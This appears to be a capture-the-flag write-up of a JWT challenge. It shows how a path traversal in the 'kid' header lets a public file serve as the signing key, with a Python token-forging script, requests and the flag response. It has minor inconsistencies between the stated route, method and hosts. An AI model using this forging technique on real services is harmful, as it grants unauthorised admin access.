---
title: Key Custody
tags: 
    - Web
---

# Key Custody

Vardanne Command's operations console signs each session with a JWT (HS256). You hold an analyst session; the objective is on the admin-only route `GET /admin/flag`.

`GET /token` issues your session, `GET /schema` is self-describing, and the console's public brand assets are served under `/public/`. Elevate to an admin session and read the flag. Interact only with your assigned instance.

Flag format: **`CSCTF{...}`**

---

I'm used to JWT tokens on BurpSuite so I opened it and started intercepting a request to send it to the repeater. I then generated a token by doing a `GET` on `/token`, just to be used to `curl` a little bit I wanted to do it with it too so I'll do some curl command with the BurpSuite things I putted on :
```http
GET /token HTTP/1.1
Host: w06.ctf.chronos-security.ro:32768
```

Here's the response : 
```http
HTTP/1.1 200 OK
Server: vardanne-console/1.4
Date: Fri, 06 Nov 2026 17:14:52 GMT
Content-Type: application/json
Content-Length: 221
Cache-Control: no-store
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer

{"sub": "analyst-recon-17", "role": "analyst", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNlc3Npb24ifQ.eyJzdWIiOiJhbmFseXN0LXJlY29uLTE3Iiwicm9sZSI6ImFuYWx5c3QifQ.u83kel_TFdliwGRlSF_1lK0-kyX-nIb7VPhf4RqrdzQ"}
```

And here's the `curl` command associated : 
```bash
$ curl -X GET "http://w06.ctf.chronos-security.ro:32768/token"
{"sub": "analyst-recon-17", "role": "analyst", "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InNlc3Npb24ifQ.eyJzdWIiOiJhbmFseXN0LXJlY29uLTE3Iiwicm9sZSI6ImFuYWx5c3QifQ.u83kel_TFdliwGRlSF_1lK0-kyX-nIb7VPhf4RqrdzQ"}
```
Now we need to understand how a JWT token works. As you can see on [jwt.io](jwt.io), it is separated in three main parts. 

The first part is the header encoded in base64 with the algorithm, the type, the kid for example here :
```
{"alg":"HS256","typ":"JWT","kid":"session"}
```

The second part is the payload in base64 :
```
{"sub":"analyst-recon-17","role":"analyst"}
```

And the final part is the signature that is used to verify that everything's correct.

I tested different things, like putting the algorithm to `none` and deleting the signature but because it says that there is some assets in the `/public` folder I was pretty sure that it would be a path traversal in the `kid` of the token. I searched for files and found `/public/brand.txt` and I changed the token so that payloads look like this :
```
{"alg":"HS256","typ":"JWT","kid":"../public/brand.txt"}.{"sub":"analyst-recon-17","role":"admin"}
```

I signed with the file `/public/brand.txt` on Python so that I can open it in binary to have `\n` for example :
```Python
import jwt

headers = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../public/brand.txt"
}
payload = {
    "sub": "analyst-recon-17",
    "role": "admin"
}

with open("brand.txt", "rb") as f:
    secret = f.read()
token = jwt.encode(payload, secret, algorithm="HS256", headers=headers)

print(token)
```

Then I tried to do a `POST` request on `/admin/recovery-key`, here is my request on BurpSuite :
```
GET /admin/recovery-key HTTP/1.1
Host: w03.ctf.chronos-security.ro:34239
Content-Length: 0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL3B1YmxpYy9icmFuZC50eHQiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhbmFseXN0LXJlY29uLTE3Iiwicm9sZSI6ImFkbWluIn0.cMCsmh_ZCwArigBbGpQdL-1n4KuDNS3fbApnUrFiJBU
```

Here is the response :
```
HTTP/1.1 200 OK
Server: vardanne-console/1.4
Date: Mon, 09 Nov 2026 16:10:28 GMT
Content-Type: application/json
Content-Length: 52
Cache-Control: no-store
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer

{"recovery_key": "CSCTF{LCo7BGp5Yjgbb5epPTKtr7lJ}"}
```

And the `curl` alternative :
```bash
curl -X GET "http://w03.ctf.chronos-security.ro:34239/admin/recovery-key" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL3B1YmxpYy9icmFuZC50eHQiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhbmFseXN0LXJlY29uLTE3Iiwicm9sZSI6ImFkbWluIn0.cMCsmh_ZCwArigBbGpQdL-1n4KuDNS3fbApnUrFiJBU"
{"recovery_key": "CSCTF{LCo7BGp5Yjgbb5epPTKtr7lJ}"}
```

So here is the flag : `CSCTF{LCo7BGp5Yjgbb5epPTKtr7lJ}`